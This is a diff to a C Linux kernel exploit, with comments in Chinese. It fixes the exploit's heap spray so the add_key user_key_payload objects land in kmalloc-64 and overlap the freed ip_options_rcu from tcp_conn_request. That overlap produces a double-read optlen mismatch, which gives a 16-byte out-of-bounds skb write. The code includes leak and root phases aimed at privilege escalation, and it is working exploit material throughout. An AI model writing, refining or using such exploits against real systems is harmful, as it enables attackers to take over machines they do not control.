@@ -52,8 +52,29 @@
 
 #define KEY_SPEC_PROCESS_KEYRING (-2)
 
+/* 假 optlen：写进喷淋对象 data[0] 的值，也就是第二次读到的 optlen。
+ *
+ * 第一次读发生在 skb_push 之前，用的是真实 optlen=40（决定头部预留 60 字节）；
+ * 第二次读在 skb_push 之后，若槽位已被我们的对象占住，这里拿到 56，
+ * memcpy 就多写 16 字节到 skb 里 —— 这就是写原语的来源。
+ *
+ * 注意：56 是**被读到的字段值**，不是分配大小。分配发生在更早的
+ * tcp_conn_request，那时 optlen 还是包里的 40，所以对象稳稳落在 kmalloc-64。 */
 #define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16 */
-#define KEY_DATALEN    72        /* 0x18 + 72 = 96 → kmalloc-96 */
+/* 喷淋对象必须和漏洞对象落在**同一个 kmalloc 桶**。
+ *
+ * 漏洞对象是 tcp_conn_request 里分配的（反汇编 +0x4ac）：
+ *     add x0, x24, #0xc        ; size = optlen + 12
+ *     bl  __kmalloc
+ *     str x25, [x19, #224]     ; → sk->ireq_opt
+ * optlen=40 → 52 字节 → **kmalloc-64**（不是 96！）。
+ *
+ * user_key_payload 的布局是 rcu_head(0x10) + datalen(0x10) + data[]，
+ * 总大小 = 0x18 + datalen。要落进 kmalloc-64 就得 ≤64：
+ *     datalen = 40 → 0x18 + 40 = 64  ✅
+ * 这样 data[0] 正好落在对象 +0x18，和 ip_options_rcu.optlen 对齐；
+ * data[8] 落在 +0x20，和 __data 对齐。 */
+#define KEY_DATALEN    40        /* 0x18 + 40 = 64 → kmalloc-64 */
 #define KEY_SPRAY_N    256
 
 /* ------------------------------------------------------------------ 日志 */
@@ -359,7 +380,7 @@ static void *reader(void *arg) {
 
 /* ------------------------------------------------------------ 喷射 */
 
-/* 用 IP_OPTIONS 把 kmalloc-96 填成可控对象：每条选项前 4 字节是标记，
+/* 用 IP_OPTIONS 把 kmalloc-64 填成可控对象：每条选项前 4 字节是标记，
  * 选项整体照抄了 40 字节，所以复用发生后 SYNACK 会把我们的标记送回来。 */
 #define SPRAY_SOCKS 192
 static int g_spray[SPRAY_SOCKS];
@@ -398,7 +419,7 @@ static void spray_free(void) {
  *
  * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
  * 所以只适合“确认槽位被复用”。
- * root 阶段用 add_key：datalen=72 时 0x18+72=96 落 kmalloc-96，且
+ * root 阶段用 add_key：datalen=40 时 0x18+40=64 落 kmalloc-64，且
  * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
 enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
 static enum spray_kind g_spray_kind = SPRAY_IPOPT;
@@ -406,7 +427,7 @@ static uint8_t g_fake_optlen = 40;
 
 /* ---- add_key 喷射 ----
  *
- * 每个 key 占一个 kmalloc-96 槽位。key 本身要留在 keyring 里，槽位才不被
+ * 每个 key 占一个 kmalloc-64 槽位。key 本身要留在 keyring 里，槽位才不被
  * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
 static int32_t g_keys[KEY_SPRAY_N];
 static int g_key_n;
@@ -452,7 +473,7 @@ static void key_spray_free(void) {
  *
  * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
  * 真正拷贝之前就被占住，中间只有微秒级窗口。所以竞态期间开一个线程不停
- * 地“关掉一批 → 重新分配一批”，让 kmalloc-96 一直有我们的对象进出。 */
+ * 地“关掉一批 → 重新分配一批”，让 kmalloc-64 一直有我们的对象进出。 */
 static void *spray_worker(void *arg) {
     (void)arg;
     while (g_spray_run) {
@@ -1600,7 +1621,7 @@ static int phase_leak(struct hit_ctx *hit) {
  *
  * ---- 怎么让两次读到不同的值 ----
  *
- * 关键：找一个同样落在 kmalloc-96、而且能把数据写到 optlen 那个位置的对象。
+ * 关键：找一个同样落在 kmalloc-64、而且能把数据写到 optlen 那个位置的对象。
  *
  *   struct ip_options_rcu          user_key_payload（add_key "user" 类型）
  *   +0x00 rcu_head (16)            +0x00 rcu_head (16)
@@ -1609,7 +1630,7 @@ static int phase_leak(struct hit_ctx *hit) {
  *   +0x20 __data[40]         <---> +0x20 data[8..]    ← 完全重合
  *
  * user_preparse 里是 __kmalloc(datalen + 0x18)，datalen=72 时正好 96 字节，
- * 落进 kmalloc-96。于是：
+ * 落进 kmalloc-64。于是：
  *   data[0]  = 我们想要的假 optlen（比如 56）
  *   data[8..]= 我们想要的 __data 内容
  *
@@ -1674,7 +1695,7 @@ static void report_write_plan(void) {
         WRITE_OPTLEN, WRITE_OPTLEN);
     say("[write] 越界 = %d 字节，落在 skb 线性数据之后", WRITE_OPTLEN - OPT_MAXLEN);
     say("[write] 目的地址由内核算：skb->head + network_header + 20");
-    say("[write] 对象来源：add_key(user) datalen=%d → kmalloc-96", KEY_DATALEN);
+    say("[write] 对象来源：add_key(user) datalen=%d → 共 %d 字节 → kmalloc-64", KEY_DATALEN, 0x18 + KEY_DATALEN);
     say("[write] optlen 位置 +0x18 与 user_key_payload.data[0] 重合");
 }
 
@@ -1708,7 +1729,7 @@ static int phase_root(struct hit_ctx *hit) {
         say("[!] add_key 不可用，写原语无法构造");
         return 1;
     }
-    say("[key] 喷了 %d 个 user key（每个 96 字节，kmalloc-96）", made);
+    say("[key] 喷了 %d 个 user key（每个 %d 字节，kmalloc-64）", made, 0x18 + KEY_DATALEN);
     key_spray_free();
     say("[key] 已释放");
 
